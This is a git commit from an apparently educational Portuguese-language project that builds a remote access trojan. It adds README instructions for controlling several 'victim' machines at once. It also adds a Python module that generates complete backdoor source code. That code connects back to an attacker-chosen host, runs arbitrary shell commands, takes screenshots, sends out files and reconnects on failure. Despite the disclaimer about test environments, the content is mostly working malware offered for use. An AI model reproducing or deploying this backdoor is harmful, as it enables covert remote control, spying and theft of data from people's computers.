7ed6503bee672f19efb95c037697ab2605240ff1
lucas <lbab@ic.ufal.br>
2021-09-23 14:26:04 -0300

    Finalizando o README

--- README.md
+++ README.md
@@ -5,7 +5,9 @@
 ## Lucas Buarque de Araujo Barros
 #
 
-<img src="./assets/spy.png">
+<p align="center">
+    <img src="./assets/spy.png">
+</p>
 
 &nbsp;
 
@@ -17,6 +19,7 @@ O projeto foi desenvolvido com o intuito de exemplificar uma forma existente de 
 
 Obs: Este projeto não incentiva de nenhuma maneira a execução de crimes cibernéticos, utilize-o apenas em ambientes de teste.
 
+&nbsp;
 
 # Como Executar
 Para executar o programa, você precisará ter o Python 3 instalado em sua máquina e deverá instalar as bibliotecas externas utilizadas no programa.
@@ -34,9 +37,13 @@ python3 main.py
 
 Obs: É necessário fazer a instalação das bibliotecas na máquina alvo, pois o backdoor não será compilado para executável.
 
+&nbsp;
+
 # Instruções
 
-<img src="./assets/main-menu.png">
+<p align="center">
+    <img src="./assets/main-menu.png">
+</p>
 
 &nbsp;
 
@@ -49,4 +56,64 @@ Obs: Em ataques reais, malwares RAT, geralmente, são compilados para arquivos e
 &nbsp;
 
 ## [2] - Iniciar o servidor
-Esta opção te permitirá iniciar um servidor que irá esperar por conexões com máquinas alvo. Ao selecionar esta opção, o programa te pedirá o endereço IP da máquina que iniciará o servidor (HOST) e sua respectiva porta. Após isso, ele iniciará o servidor e esperará por conexões.
+Esta opção te permitirá iniciar um servidor que irá esperar por conexões com máquinas alvo. Ao selecionar esta opção, o programa te pedirá o endereço IP da máquina que iniciará o servidor (HOST) e sua respectiva porta. Após isso, ele iniciará o servidor e esperará por conexões. O projeto trabalha com multithreads, ou seja, o atacante poderá ter acesso remoto a vários computadores ao mesmo tempo.
+
+&nbsp;
+
+# Após estabelecer conexões
+<p align="center"> 
+    <img src="./assets/handlermenu.png">
+</p>
+
+&nbsp;
+
+## Opções
+
+* -l Lista todas as conexões (sessões) abertas com máquinas alvo;
+* -x Fecha todas as conexões abertas;
+* -i [id] Interage como uma determinada sessão (Acesso à máquina alvo);
+* -h Mostra o menu de opções novamente;
+* -c Limpa o terminal para uma melhor visualização.
+
+# Interagindo com um alvo
+<p align="center"> 
+    <img src="./assets/victmmenu.png">
+</p>
+
+&nbsp;
+
+# -m
+Envia uma mensagem para a máquina alvo
+
+Resultado:
+<p align="center">
+    <img src="./assets/message.png">
+</p>
+
+&nbsp;
+
+# -s
+Executa uma captura de tela da máquina alvo e salva no computador do atacante.
+
+Resultado:
+<p align="center">
+    <img src="./assets/screenshot.png">
+</p>
+
+# -c 
+Dá acesso ao shell de comandos da máquina alvo ao atacante.
+
+Resultado:
+<p align="center">
+    <img src="./assets/shell.png">
+</p>
+
+&nbsp;
+
+# Outros comandos
+
+* -u Envia um arquivo do servidor para o cliente (máquina alvo);
+* -d O servidor pode fazer o download de um arquivo da máquina alvo;
+* -b Põe a sessão que está interagindo atualmente com o atacante em background. Ou seja, ela continuará existindo, mas estará em segundo plano. Sendo assim, o atacante poderá interagir com todas as sessões abertas quando quiser, sem a necessidade de fechá-las;
+* -k Fecha a conexão com a vítima;
+* -h Mostra o menu de opções;
---
+++ src/utils.py
@@ -0,0 +1,232 @@
+from time import sleep
+from tqdm import tqdm
+from os import system
+
+GREEN = '\033[60m'
+RESET = '\u001b[0m'
+
+logo = '''
+            .▄▄ ·  ▄▄▄· ▄· ▄▌
+            ▐█ ▀. ▐█ ▄█▐█▪██▌
+            ▄▀▀▀█▄ ██▀·▐█▌▐█▪
+            ▐█▄▪▐█▐█▪·• ▐█▀·.
+             ▀▀▀▀ .▀     ▀ • 
+'''
+eye = '''
+                ___________
+            .-=d88888888888b=-.
+        .:d8888pr"|\|/-\|'rq8888b.
+      ,:d8888P^//\-\/_\ /_\/^q888/b.
+    ,;d88888/~-/ .-~  _~-. |/-q88888b,
+   //8888887-\ _/          \\-\/Y88888b\\
+   \8888888|// T    (#)    Y _/|888888/
+    \q88888|- \l           !\_/|88888p/
+     'q8888l\-//\         / /\|!8888P/
+       'q888\/-| "-,___.-^\/-\/888P'
+         `=88\./-/|/ |-/!\/-!/88='
+            ^^"=============="^    
+'''
+def draw_animation():
+    system("clear")
+    global logo, eye
+
+    for c in logo:
+        print(c, end="")
+        if (c == '\n'):
+            sleep(0.1)
+            print(" " * 18, end="")
+
+    for c in eye:
+        print(c, end="")
+        if (c == '\n'):
+            sleep(0.1)
+            print(" " * 18, end="")
+
+    print("\n\n")
+    with tqdm(total=100, desc="Starting", bar_format="{l_bar}{bar:40}") as pbar:
+        for i in range(100):
+            sleep(0.01)
+            pbar.update(1)
+    
+    sleep(1)
+
+def draw_main_menu():
+    system("clear")
+    print(" " * 25)
+    print(" " * 25)
+    print(" " * 25)
+    print(" " * 25)
+    print(" " * 25 + "[1] - Generate Backdoor")
+    print(" " * 25 + "[2] - Start session handler")
+    print(" " * 25 + "[0] - Exit")
+    print(" " * 25)
+    print(" " * 25)
+    print(" " * 25)
+    print(" " * 25)
+
+
+def generate_backdoor_code(lhost, lport):
+    return f'''import socket, os, sys, platform, time
+import pyscreeze
+import subprocess
+from tkinter import *
+import threading
+
+host = "{lhost}"
+port = {lport}
+buffer_size = 1024
+
+s = socket.socket()
+
+def server_connect():
+    while True:
+        try:
+            s.connect((host, port))
+        except socket.error:
+            time.sleep(5)
+        else: break
+    
+    userInfo = socket.gethostname() + "'," + platform.system() + " " + platform.release()
+    send_data(str.encode(userInfo))
+
+def decode_utf8(data):
+    return data.decode("utf-8")
+def receive_data(buffer):
+    return s.recv(buffer)
+def send_data(data):
+    try:
+        s.send(data)
+    except:
+        pass
+def take_screenshot():
+    picture_name = "beautiful.png"
+    try:
+        pyscreeze.screenshot(picture_name)
+
+        file = open(picture_name, "rb")
+        
+        image_data = file.read(1024)
+
+        while image_data:
+            send_data(image_data)
+            image_data = file.read(1024)
+
+        time.sleep(1)
+        send_data('done'.encode())
+        file.close()
+        os.remove(picture_name)
+    except:
+        pass
+
+def send_file(file_directory):
+    try:
+        file_size = os.path.getsize(file_directory)
+    except:
+        send_data('NotFound'.encode())
+        return
+    send_data('pass'.encode())
+
+    time.sleep(0.5)
+
+    file = open(file_directory, "rb")
+    bytes_read = file.read(4096)
+    
+    while bytes_read:
+        send_data(bytes_read)
+        bytes_read = file.read(4096)
+    
+    time.sleep(1)
+    file.close()    
+    send_data('done'.encode())
+
+def receive_file(file_name):
+    with open(file_name, "wb") as f:
+        while True:
+            bytes_read = s.recv(4096)
+            if bytes_read == 'done'.encode():
+                f.close()
+                break
+            f.write(bytes_read)
+
+def receive_message():
+    message = ''
+    while True:
+            bytes_read = receive_data(4096)
+            try:
+                if bytes_read == 'done'.encode():
+                    break
+                message += decode_utf8(bytes_read)
+            except:
+                pass
+    if message != '':
+        def messageBox():
+            screen = Tk()
+            screen.title('Letter for you!')
+            screen.geometry('300x300')
+            screen.configure(background='#8B0000')
+            label = Label(screen, text=message, background='#8B0000', foreground='#fff')
+            label.place(x=0, y=110, width=300, height=40)
+            screen.mainloop()
+
+        threading.Thread(target=messageBox).start()
+
+def shell():
+    global buffer_size
+    SEPARATOR = '<sep>'
+    initial_dir = os.getcwd()
+
+    send_data(initial_dir.encode())
+
+    while True:
+        cmd = receive_data(buffer_size * 128).decode()
+        splited_cmd = cmd.split()
+
+        if cmd.lower() == 'exit':
+            break
+        
+        if splited_cmd[0] == 'cd':
+            try:
+                os.chdir(''.join(splited_cmd[1:]))
+            except FileNotFoundError as e:
+                output = e
+            else:
+                output = ''
+        else:
+            output = subprocess.getoutput(cmd)
+        
+        cwd = os.getcwd()
+        message = output + SEPARATOR + cwd
+        send_data(message.encode())
+
+    os.chdir(initial_dir)
+
+server_connect()
+
+while True:
+    try:
+        while True:
+            data = receive_data(buffer_size)
+            data = decode_utf8(data)
+            if data == "exit":
+                s.close()
+                sys.exit(0)
+            elif data == "screenshot":
+                take_screenshot()
+            elif 'upload-file' in data:
+                file_directory = data.split(" ")[1]
+                receive_file(file_directory)
+            elif 'download-file' in data:
+                file_directory = data.split(" ")[1]
+                send_file(file_directory)
+            elif 'message' in data:
+                receive_message()
+            elif 'shell' in data:
+                shell()
+            else:
+                print(data)
+    except socket.error:
+        s.close()
+        del s
+        server_connect()
+'''
+    
